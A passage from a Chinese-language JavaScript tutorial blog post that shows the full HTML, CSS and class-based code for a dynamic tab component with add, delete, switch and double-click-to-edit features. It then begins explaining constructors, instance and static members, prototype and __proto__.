&#125;</span><br></pre></td></tr></table></figure><h3 id="双击Tab栏，可以编辑Tab栏名称"><a href="#双击Tab栏，可以编辑Tab栏名称" class="headerlink" title="双击Tab栏，可以编辑Tab栏名称"></a>双击Tab栏，可以编辑Tab栏名称</h3><p><img src="https://i.loli.net/2021/06/07/uXGUIc1B4OPwZko.gif" alt="编辑tab页.gif"></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">init</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.lis.length; i++) &#123;</span><br><span class="line">           <span class="comment">//双击</span></span><br><span class="line">           <span class="built_in">this</span>.spans[i].ondblclick = <span class="built_in">this</span>.editTab;</span><br><span class="line">           <span class="built_in">this</span>.sections[i].ondblclick = <span class="built_in">this</span>.editTab;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="title">updateNode</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">       <span class="built_in">this</span>.spans = <span class="built_in">this</span>.main.querySelectorAll(<span class="string">&#x27;.fisrstnav li span:first-child&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// 4. 修改功能</span></span><br><span class="line">   <span class="function"><span class="title">editTab</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">       <span class="comment">//获取原先内容</span></span><br><span class="line">       <span class="keyword">var</span> str = <span class="built_in">this</span>.innerHTML;</span><br><span class="line">       <span class="comment">// 双击禁止选定文字</span></span><br><span class="line">       <span class="built_in">window</span>.getSelection ? <span class="built_in">window</span>.getSelection().removeAllRanges() : <span class="built_in">document</span>.selection.empty();</span><br><span class="line">       <span class="comment">// 双击文字的时候，在里面生成一个文本框, 当失去焦点或者按下回车 把文本框输入的值给原先元素</span></span><br><span class="line">       <span class="built_in">this</span>.innerHTML = <span class="string">&#x27;&lt;input type=&quot;text&quot; /&gt;&#x27;</span>;</span><br><span class="line">       <span class="keyword">var</span> input = <span class="built_in">this</span>.children[<span class="number">0</span>];</span><br><span class="line">       <span class="comment">//若没有更改，则赋值原先内容</span></span><br><span class="line">       input.value = str;</span><br><span class="line">       <span class="comment">// 出现文本框时，里面的文字处于选定状态</span></span><br><span class="line">       input.select();</span><br><span class="line">       <span class="comment">// 当我们离开文本框就把文本框里面的值给span </span></span><br><span class="line">       input.onblur = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">           <span class="comment">//this指向input</span></span><br><span class="line">           <span class="built_in">this</span>.parentNode.innerHTML = <span class="built_in">this</span>.value;</span><br><span class="line">       &#125;;</span><br><span class="line">       <span class="comment">// 按下回车也可以把文本框里面的值给span</span></span><br><span class="line">       input.onkeyup = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">           <span class="keyword">if</span> (e.keyCode === <span class="number">13</span>) &#123;</span><br><span class="line">               <span class="comment">// 手动调用表单失去焦点事件  不需要鼠标离开操作</span></span><br><span class="line">               <span class="built_in">this</span>.blur();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="需注意的一些细节"><a href="#需注意的一些细节" class="headerlink" title="需注意的一些细节"></a>需注意的一些细节</h3><ol><li><strong>删除</strong>一个栏目<strong>后默认选中前一个</strong>栏目</li><li>新增的栏目<strong>也能实现基本功能</strong></li><li>当默认选中的是第一个，并且删除的时候，选中删除后的第一个</li><li>在编辑Tab名称的时候，<strong>回车键</strong>也能<strong>确认</strong>编辑</li><li>新增的栏目<strong>默认选中</strong></li></ol><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p><strong>html：</strong></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>面向对象 Tab<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./styles/tab.css&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./styles/style.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">main</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h4</span>&gt;</span></span><br><span class="line">            Js 面向对象 动态添加标签页</span><br><span class="line">        <span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;tabsbox&quot;</span> <span class="attr">id</span>=<span class="string">&quot;tab&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- tab 标签 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">&quot;fisrstnav&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;liactive&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>测试1<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;iconfont icon-guanbi&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>测试2<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;iconfont icon-guanbi&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>测试3<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;iconfont icon-guanbi&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;tabadd&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">span</span>&gt;</span>+<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">&lt;!-- tab 内容 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;tabscon&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;conactive&quot;</span>&gt;</span>测试1<span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">section</span>&gt;</span>测试2<span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">section</span>&gt;</span>测试3<span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/tab.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>css:</strong></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">* &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">ul</span> <span class="selector-tag">li</span> &#123;</span><br><span class="line">    <span class="attribute">list-style</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">main</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">960px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">500px</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">50px</span> auto;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">main</span> <span class="selector-tag">h4</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tabsbox</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">900px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid lightsalmon;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">nav</span> <span class="selector-tag">ul</span> &#123;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">nav</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span> &#123;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">border-right</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">nav</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span><span class="selector-class">.liactive</span> &#123;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">2px</span> solid <span class="number">#fff</span>;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">9</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#tab</span> <span class="selector-tag">input</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">80%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">60%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">nav</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span> <span class="selector-tag">span</span><span class="selector-pseudo">:last-child</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    user-select: none;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">12px</span>;</span><br><span class="line">    <span class="attribute">top</span>: -<span class="number">18px</span>;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tabadd</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="comment">/* width: 100px; */</span></span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tabadd</span> <span class="selector-tag">span</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;</span><br><span class="line">    <span class="attribute">float</span>: right;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">10px</span>;</span><br><span class="line">    user-select: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tabscon</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">30px</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0px</span>;</span><br><span class="line">    <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">    <span class="attribute">border-top</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tabscon</span> <span class="selector-tag">section</span>,</span><br><span class="line"><span class="selector-class">.tabscon</span> <span class="selector-tag">section</span><span class="selector-class">.conactive</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: none;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tabscon</span> <span class="selector-tag">section</span><span class="selector-class">.conactive</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>javascript:</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> that;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tab</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">id</span>)</span> &#123;</span><br><span class="line">        <span class="comment">// 获取元素</span></span><br><span class="line">        that = <span class="built_in">this</span>;</span><br><span class="line">        <span class="built_in">this</span>.main = <span class="built_in">document</span>.querySelector(id);</span><br><span class="line">        <span class="built_in">this</span>.add = <span class="built_in">this</span>.main.querySelector(<span class="string">&#x27;.tabadd&#x27;</span>);</span><br><span class="line">        <span class="comment">// li的父元素</span></span><br><span class="line">        <span class="built_in">this</span>.ul = <span class="built_in">this</span>.main.querySelector(<span class="string">&#x27;.fisrstnav ul:first-child&#x27;</span>);</span><br><span class="line">        <span class="comment">// section 父元素</span></span><br><span class="line">        <span class="built_in">this</span>.fsection = <span class="built_in">this</span>.main.querySelector(<span class="string">&#x27;.tabscon&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.init();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">init</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.updateNode();</span><br><span class="line">            <span class="comment">// init 初始化操作让相关的元素绑定事件</span></span><br><span class="line">            <span class="built_in">this</span>.add.onclick = <span class="built_in">this</span>.addTab;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.lis.length; i++) &#123;</span><br><span class="line">                <span class="built_in">this</span>.lis[i].index = i;</span><br><span class="line">                <span class="built_in">this</span>.lis[i].onclick = <span class="built_in">this</span>.toggleTab;</span><br><span class="line">                <span class="built_in">this</span>.remove[i].onclick = <span class="built_in">this</span>.removeTab;</span><br><span class="line">                <span class="built_in">this</span>.spans[i].ondblclick = <span class="built_in">this</span>.editTab;</span><br><span class="line">                <span class="built_in">this</span>.sections[i].ondblclick = <span class="built_in">this</span>.editTab;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 因为我们动态添加元素 需要从新获取对应的元素</span></span><br><span class="line">    <span class="function"><span class="title">updateNode</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.lis = <span class="built_in">this</span>.main.querySelectorAll(<span class="string">&#x27;li&#x27;</span>);</span><br><span class="line">            <span class="built_in">this</span>.sections = <span class="built_in">this</span>.main.querySelectorAll(<span class="string">&#x27;section&#x27;</span>);</span><br><span class="line">            <span class="built_in">this</span>.remove = <span class="built_in">this</span>.main.querySelectorAll(<span class="string">&#x27;.icon-guanbi&#x27;</span>);</span><br><span class="line">            <span class="built_in">this</span>.spans = <span class="built_in">this</span>.main.querySelectorAll(<span class="string">&#x27;.fisrstnav li span:first-child&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 1. 切换功能</span></span><br><span class="line">    <span class="function"><span class="title">toggleTab</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">            <span class="comment">// console.log(this.index);</span></span><br><span class="line">            that.clearClass();</span><br><span class="line">            <span class="built_in">this</span>.className = <span class="string">&#x27;liactive&#x27;</span>;</span><br><span class="line">            that.sections[<span class="built_in">this</span>.index].className = <span class="string">&#x27;conactive&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 清除所有li 和section 的类</span></span><br><span class="line">    <span class="function"><span class="title">clearClass</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.lis.length; i++) &#123;</span><br><span class="line">                <span class="built_in">this</span>.lis[i].className = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                <span class="built_in">this</span>.sections[i].className = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 2. 添加功能</span></span><br><span class="line">    <span class="function"><span class="title">addTab</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">            that.clearClass();</span><br><span class="line">            <span class="comment">// (1) 创建li元素和section元素 </span></span><br><span class="line">            <span class="keyword">var</span> random = <span class="built_in">Math</span>.random();</span><br><span class="line">            <span class="keyword">var</span> li = <span class="string">&#x27;&lt;li class=&quot;liactive&quot;&gt;&lt;span&gt;新选项卡&lt;/span&gt;&lt;span class=&quot;iconfont icon-guanbi&quot;&gt;&lt;/span&gt;&lt;/li&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">var</span> section = <span class="string">&#x27;&lt;section class=&quot;conactive&quot;&gt;测试 &#x27;</span> + random + <span class="string">&#x27;&lt;/section&gt;&#x27;</span>;</span><br><span class="line">            <span class="comment">// (2) 把这两个元素追加到对应的父元素里面</span></span><br><span class="line">            that.ul.insertAdjacentHTML(<span class="string">&#x27;beforeend&#x27;</span>, li);</span><br><span class="line">            that.fsection.insertAdjacentHTML(<span class="string">&#x27;beforeend&#x27;</span>, section);</span><br><span class="line">            that.init();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 3. 删除功能</span></span><br><span class="line">    <span class="function"><span class="title">removeTab</span>(<span class="params">e</span>)</span> &#123;</span><br><span class="line">            e.stopPropagation(); <span class="comment">// 阻止冒泡 防止触发li 的切换点击事件</span></span><br><span class="line">            <span class="keyword">var</span> index = <span class="built_in">this</span>.parentNode.index;</span><br><span class="line">            <span class="built_in">console</span>.log(index);</span><br><span class="line">            <span class="comment">// 根据索引号删除对应的li 和section   remove()方法可以直接删除指定的元素</span></span><br><span class="line">            that.lis[index].remove();</span><br><span class="line">            that.sections[index].remove();</span><br><span class="line">            that.init();</span><br><span class="line">            <span class="comment">// 当我们删除的不是选中状态的li 的时候,原来的选中状态li保持不变</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">document</span>.querySelector(<span class="string">&#x27;.liactive&#x27;</span>)) <span class="keyword">return</span>;</span><br><span class="line">            <span class="comment">// 当我们删除了选中状态的这个li 的时候, 让它的前一个li 处于选定状态</span></span><br><span class="line">            index--;</span><br><span class="line">            <span class="comment">// 手动调用我们的点击事件  不需要鼠标触发</span></span><br><span class="line">            that.lis[index] &amp;&amp; that.lis[index].click();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 4. 修改功能</span></span><br><span class="line">    <span class="function"><span class="title">editTab</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> str = <span class="built_in">this</span>.innerHTML;</span><br><span class="line">        <span class="comment">// 双击禁止选定文字</span></span><br><span class="line">        <span class="built_in">window</span>.getSelection ? <span class="built_in">window</span>.getSelection().removeAllRanges() : <span class="built_in">document</span>.selection.empty();</span><br><span class="line">        <span class="comment">// alert(11);</span></span><br><span class="line">        <span class="built_in">this</span>.innerHTML = <span class="string">&#x27;&lt;input type=&quot;text&quot; /&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">var</span> input = <span class="built_in">this</span>.children[<span class="number">0</span>];</span><br><span class="line">        input.value = str;</span><br><span class="line">        input.select(); <span class="comment">// 文本框里面的文字处于选定状态</span></span><br><span class="line">        <span class="comment">// 当我们离开文本框就把文本框里面的值给span </span></span><br><span class="line">        input.onblur = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.parentNode.innerHTML = <span class="built_in">this</span>.value;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 按下回车也可以把文本框里面的值给span</span></span><br><span class="line">        input.onkeyup = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (e.keyCode === <span class="number">13</span>) &#123;</span><br><span class="line">                <span class="comment">// 手动调用表单失去焦点事件  不需要鼠标离开操作</span></span><br><span class="line">                <span class="built_in">this</span>.blur();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> Tab(<span class="string">&#x27;#tab&#x27;</span>);</span><br></pre></td></tr></table></figure><hr><h1 id="构造函数和原型"><a href="#构造函数和原型" class="headerlink" title="构造函数和原型"></a>构造函数和原型</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在<strong>ES6之前</strong>，对象不是基于类创建的，而是用一种称为<strong>构造函数</strong>的特殊函数来定义对象和他们的特征。</p><p>创建对象可通过以下三种方式：</p><p>1.对象字面量 <code>var obj1 = &#123;&#125;</code></p><p>2.new Object() <code>var obj2 = new Object()</code></p><p>3.利用构造函数创建对象</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Star</span>(<span class="params">uname, age</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.uname = uname;</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">    <span class="built_in">this</span>.sing = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;我会唱歌&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ldh = <span class="keyword">new</span> Star(<span class="string">&#x27;刘德华&#x27;</span>, <span class="number">18</span>);</span><br><span class="line"><span class="keyword">var</span> zxy = <span class="keyword">new</span> Star(<span class="string">&#x27;张学友&#x27;</span>, <span class="number">19</span>);</span><br><span class="line">ldh.sing();</span><br><span class="line">zxy.sing();</span><br></pre></td></tr></table></figure><h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><p><strong>构造函数</strong>是一种特殊的函数，主要用来初始化对象，即为对象成员变量赋初始值，它总与 new 一起使用。我们可以把对象中一些公共的属性和方法抽取出来，然后封装到这个函数里面。</p><p>在 JS 中，使用构造函数时要注意以下两点：</p><ol><li>构造函数用于创建某一类对象，其首字母要大写</li><li>构造函数要和 new 一起使用才有意义：构造一个对象，如new Array()，创建一个数组对象</li></ol><p><strong>new 在执行时会做四件事情</strong>：</p><ol><li>在内存中创建一个新的空对象。</li><li>让 this 指向这个新的对象。</li><li>执行构造函数里面的代码，给这个新对象添加属性和方法。</li><li>返回这个新对象（所以构造函数里面<strong>不需要 return</strong> ）。</li></ol><p>JavaScript 的构造函数中可以添加一些成员，可以在构造函数本身上添加，也可以在构造函数内部的 this 上添加。通过这两种方式添加的成员，就分别称为<strong>静态成员</strong>和<strong>实例成员</strong>。</p><ol><li><p>静态成员：在构造函数本上添加的成员称为静态成员，只能由<strong>构造函数本身</strong>来访问</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 2. 静态成员 在构造函数本身上添加的成员  sex 就是静态成员</span></span><br><span class="line">Star.sex = <span class="string">&#x27;男&#x27;</span>;</span><br><span class="line"><span class="comment">// 静态成员只能通过构造函数来访问</span></span><br><span class="line"><span class="built_in">console</span>.log(Star.sex); <span class="comment">//男</span></span><br><span class="line"><span class="built_in">console</span>.log(ldh.sex); <span class="comment">// undefined 不能通过对象来访问</span></span><br></pre></td></tr></table></figure></li><li><p>实例成员：在构造函数内部创建的对象成员称为实例成员，只能由<strong>实例化的对象</strong>来访问</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.实例成员就是构造函数内部通过this添加的成员 uname age sing 就是实例成员</span></span><br><span class="line"><span class="comment">// 实例成员只能通过实例化的对象来访问</span></span><br><span class="line"><span class="built_in">console</span>.log(ldh.uname); <span class="comment">// 刘德华</span></span><br><span class="line">ldh.sing(); <span class="comment">// 我会唱歌</span></span><br><span class="line"><span class="built_in">console</span>.log(Star.uname); <span class="comment">// undefined 不可以通过构造函数来访问实例成员</span></span><br></pre></td></tr></table></figure></li></ol><p>但是构造函数存在浪费内存的问题：</p><p><img src="https://i.loli.net/2021/06/07/52ZDcTCJgspBIvO.jpg" alt="Snipaste_2021-06-07_09-30-44.jpg"></p><h2 id="构造函数原型对象-prototype"><a href="#构造函数原型对象-prototype" class="headerlink" title="构造函数原型对象 prototype"></a>构造函数原型对象 prototype</h2><p>构造函数通过原型分配的函数是所有对象所<strong>共享的</strong></p><p>JavaScript规定，<strong>每个构造函数都有一个prototype属性</strong>，指向另一个对象，注意这个prototype（原型）就是一个对象，这个对象的所有属性和方法，都会被构造函数所拥有</p><p>因此，我们把那些<strong>不变的方法，直接定义在prototype对象</strong>上，这样所有对象的实例就可以<strong>共享这个方法</strong></p><!--一般情况下,我们的公共属性定义到构造函数里面, 公共的方法我们放到原型对象身上--><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Star.prototype.sing = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;我会唱歌&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="对象原型-proto"><a href="#对象原型-proto" class="headerlink" title="对象原型__proto__"></a>对象原型<code>__proto__</code></h2><p><strong>对象都会有一个属性</strong> <code>__proto__</code> 指向构造函数的prototype原型对象，之所以我们对象可以使用构造函数prototype原型对象的属性和方法，就是因为 <code>__proto__</code> 的存在</p><p><code>__proto__</code>对象原型和原型对象 prototype 是等价的(<code>ldh.__proto__ === Star.prototype</code>)</p><p>方法的查找规则: 首先先看ldh 对象身上是否有 sing 方法,如果有就执行这个对象上的sing。如果有sing 这个方法,因为有<code>__proto__ </code>的存在,就去构造函数原型对象prototype身上去查找sing这个方法。</p><h2 id="constructor构造函数"><a href="#constructor构造函数" class="headerlink" 